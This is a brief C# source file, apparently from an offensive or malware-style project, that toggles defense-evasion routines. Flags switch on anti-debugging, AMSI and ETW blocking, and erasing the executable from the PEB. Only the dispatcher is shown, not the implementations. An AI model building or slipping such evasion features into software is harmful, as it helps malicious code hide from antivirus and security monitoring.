
/* 
|| AUTHOR Arsium ||
|| github : https://github.com/arsium       ||
*/

namespace Offline.Special
{
    public static class Parser
    {
        public static void Parse(bool amsiBlock = false, bool etwBlock = false, bool erasePEFromPEB = false, bool antiDBG = false) 
        {
            if (antiDBG && AntiDBG.isThreadLaunched == false)
                AntiDBG.BlockIt();

            if (amsiBlock)
                AMSI.BlockIt();

            if(etwBlock)
                ETW.BlockIt();

            if (erasePEFromPEB)
                PEFromPEB.BlockIt();
        }
    }
}
